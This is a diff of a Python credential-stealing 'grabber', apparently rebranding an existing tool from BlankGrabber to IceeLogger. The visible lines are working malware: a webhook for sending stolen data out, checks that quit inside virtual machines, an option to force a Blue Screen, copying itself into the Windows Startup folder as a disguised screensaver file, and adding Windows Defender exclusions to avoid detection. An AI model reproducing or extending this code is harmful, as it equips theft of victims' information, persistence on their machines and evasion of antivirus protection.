@@ -1,3 +1,6 @@
+# https://github.com/iceeburr/Icee-Logger
+# Please do not remove the comment on line 4, otherwise something might break!
+
 WEBHOOK = "Do NOT Enter anything here! Use the builder only!" #flag: faxxhookxxx Do not remove the flag
 
 import os, sys
@@ -26,10 +29,11 @@ else:
     _config = {}
 _errorlogs = []
 
+# Configs [Please only edit using BUILD.vbs]
 PINGME = _config.get("PINGME", True) # Pings @everyone
 VMPROTECT = _config.get("VMPROTECT", True) # Protect your grabber from VMs
 BSOD = _config.get("BSOD", True) # Tries to trigger Blue Screen if grabber force exit
-STARTUP = _config.get("STARTUP", True) # Puts the grabber in startup
+STARTUP = _config.get("STARTUP", True) # Puts the grabber in startup (Will grab information every time the user starts his computer)
 HIDE_ITSELF = _config.get("HIDE_ITSELF", True) # Hides the Grabber
 MESSAGE_BOX = _config.get("MSGBOX", dict()) # Message Box
 
@@ -148,7 +152,7 @@ class vmprotect:
         if http.request("GET", "http://ip-api.com/line/?fields=hosting").data.decode() == "true":
                 fquit()
 
-class BlankGrabber:
+class IceeLogger:
     def __init__(self):
         self.http = http
         self.webhook = WEBHOOK
@@ -706,7 +710,7 @@ if __name__ == "__main__":
                         exepath = os.path.join("C:/ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", "StartUp", f"ScreenSaver-{generate()}.scr")
                         wd_exclude(exepath)
                         wd_exclude(sys._MEIPASS)
-                        BlankGrabber.copy("Blank", sys.executable, exepath)
+                        IceeLogger.copy("Blank", sys.executable, exepath)
                     except Exception:
                         pass
             if bool(MESSAGE_BOX) and not isInStartup():
@@ -717,7 +721,7 @@ if __name__ == "__main__":
             try:
                 wd_exclude()
                 t.join()
-                BlankGrabber()
+                IceeLogger()
             except Exception:
                 pass
         except Exception:
